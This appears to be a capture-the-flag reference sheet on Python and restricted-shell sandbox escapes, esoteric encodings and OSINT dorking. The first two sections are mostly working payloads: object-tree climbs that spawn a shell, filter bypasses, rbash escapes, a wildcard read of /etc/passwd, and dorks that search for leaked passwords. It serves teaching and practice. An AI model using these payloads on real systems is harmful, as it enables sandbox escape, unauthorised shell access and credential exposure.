# Misc & OSINT CTF Reference Guide

A guide for tackling sandbox escapes (Pyjail, Bash jail, Node.js), esoteric languages, audio/radio challenges, and OSINT investigations.

---

## 1. Pyjail & Python Sandbox Escapes

### 1. Navigating the Object Tree
```python
# Traverse subclasses to find os / subprocess
[c for c in ().__class__.__bases__[0].__subclasses__() if 'warning' in c.__name__][0]._module.__builtins__['__import__']('os').system('sh')

# Using builtins directly if available
__builtins__.__dict__['__import__']('os').system('sh')

# Using sys.modules
().__class__.__base__.__subclasses__()[137].__init__.__globals__['sys'].modules['os'].system('sh')
```

### 2. Character Filter Bypasses

| Filter | Bypass Strategy | Example Payload |
| :--- | :--- | :--- |
| **No Quotes (`"`, `'`)** | `chr()` with math, `bytes([..])`, `str(dict)` | `chr(115)+chr(104)` -> `'sh'` |
| **No Underscores (`_`)** | `getattr()`, string formatting, `request.args` | `getattr(().__class__, '__base__')` |
| **No Digits (`0-9`)** | `True+True`, `len([])`, `len("a")` | `(True+True+True)` -> `3` |
| **No Dots (`.`)** | `getattr(obj, 'attr')`, `vars(obj)` | `getattr(math, 'sqrt')` |
| **No Builtins** | Recover from existing objects / frames | `().__class__.__base__.__subclasses__()` |

---

## 2. Bash / Restricted Shell (rbash) Escapes

```bash
# 1. Interactive editors and viewers
vi / vim -> :set shell=/bin/sh -> :shell
nano -> Ctrl+R Ctrl+X -> reset; sh 1>&0 2>&0
less / more / man -> !/bin/sh

# 2. Command execution flags
find / -name flag -exec /bin/sh \;
awk 'BEGIN {system("/bin/sh")}'
perl -e 'exec "/bin/sh";'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 3. Wildcards & Pathless Execution (when letters/slashes are filtered)
/???/??t /???/??ss??    # -> /bin/cat /etc/passwd
$'\x2f\x62\x69\x6e\x2f\x73\x68' # -> /bin/sh via ANSI-C quoting
```

---

## 3. Esoteric Encodings & Languages

| Signature / Look | Language / Encoding | Decoding Approach |
| :--- | :--- | :--- |
| `[][(![]+[])[+[]]+...` | **JSFuck** | Run in Node.js or browser console |
| `+-[><].,` | **Brainfuck** | Online interpreter / Python bf interpreter |
| `Ook. Ook? Ook! ` | **Ook!** | Map to Brainfuck equivalent tokens |
| Pixel grid image with colors | **Piet** | Piet visual interpreter / `npiet` |
| 2D grid with arrows `><^v` | **Befunge** | Befunge-93 interpreter |
| Empty spaces / tabs / linefeeds | **Whitespace** | Whitespace interpreter |
| `UUUU`, `====`, UUEncode format | **UUEncoding** | `uudecode` |

---

## 4. OSINT Methodology & Dorks

### Search Engine Dorking (Google / Bing / DuckDuckGo)
```text
site:target.com filetype:pdf "confidential"
site:github.com "target.com" "password"
inurl:admin "login" site:target.com
cache:target.com/page
```

### Social & Web Reconnaissance
- **Usernames**: `sherlock <username>`, `whatsmyname.app`, Namechk.
- **Historic Archives**: Wayback Machine (`archive.org`), Google Cache, Archive.today.
- **DNS & Subdomains**: `crt.sh` (Certificate Transparency logs), `amass`, `sublist3r`, `dig ANY domain.com`.
- **Geolocation**: Sun angle / shadows (SunCalc), reverse image search (Google Lens, Yandex, TinEye), street view, landmarks.
